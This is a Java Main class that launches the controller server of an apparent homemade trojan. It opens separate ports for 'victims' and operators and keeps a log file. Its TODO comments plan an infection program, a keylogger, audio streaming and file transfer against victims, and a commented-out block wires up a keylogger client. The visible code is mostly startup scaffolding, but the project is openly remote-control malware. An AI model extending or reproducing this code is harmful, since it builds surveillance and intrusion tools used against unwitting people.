package Controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream.GetField;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Enumeration;
import java.util.Properties;

import Modele.OS;
import Modele.ServerStart;

// Gerer cas d'une déconnection inopinée d'un user ou d'une victime ( dans exception) [OK]
// Gérer la mise en relation User/Serveur --> R�gler bug lorsqu'une victime en transaction se d�connecte [OK]
// Corriger affichage jtextArea -> aller � la ligne lors de la fin de ligne [OK]
// Rendre parfait le programme d'infection
// Ajouter switch avec boutons de commandes toute faites lors de la connexion avec une victime
// Ajouter premier panel de connexion 
// Ajouter Envoie de fichier
// Permettre au client un red�marrage du serveur [OK] ~> OK pour Windows mais pas pour Linux (faire script)
// Ajouter streaming audio
// Ajouter keyLogger
// Ajouter service de log
// Implémenter l'extenction du serveur
// Gérer la notion de droits et d'authentifications
// (+) S'amuser à hacker le serveur en trouvant le mot de passe par brute force :) (+ proposer à des potes de hacker :))
// régler la gestion du path du fichier log en fonction de l'os et du pc

public class Main {

	private static final String IP = "127.0.0.1";//"192.168.1.61";
	private static final int PORT_VICTIM = 2000;
	private static final int PORT_USER = 3000;
	public static final int PORT_Fichiers = 3500;
	private static String PATH_LOG ;
	
	public static OS osactu = Modele.OS.windows;
	
	public static void main(String[] args) {

		//Configuration de l'os
		configOS();
		
		
		if(System.getProperty("os.name").trim().toLowerCase().startsWith("win")) {// Windows
			PATH_LOG = "C:\\Users\\rben-hmidane\\Desktop\\logProjTroj.txt";
		}else { //Linux
			PATH_LOG = "/home/rayanox/Bureau/logProjTroj.txt";
		}
		
		
		
		
		try {
			ServerStart lancementServeur = new ServerStart(InetAddress.getByName(IP), PORT_USER, PORT_VICTIM, PATH_LOG);
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		/*
		KeyLogger keylogger = new KeyLogger();
		Client c = new Client( "127.0.0.1", 2000);
		keylogger.closeBuffer();
		*/
	}

	private static void configOS() {
		//Determination de l'OS sur lequel tourne le pc
				if(System.getProperty("os.name").trim().toLowerCase().startsWith("win")) {// Windows
					osactu = OS.windows;						
				}else if(System.getProperty("os.name").trim().toLowerCase().startsWith("lin")){ //Linux
					osactu = OS.linux;
				}else {//apple
					osactu = OS.Maccintosh;
				}
				//-----
	}

}
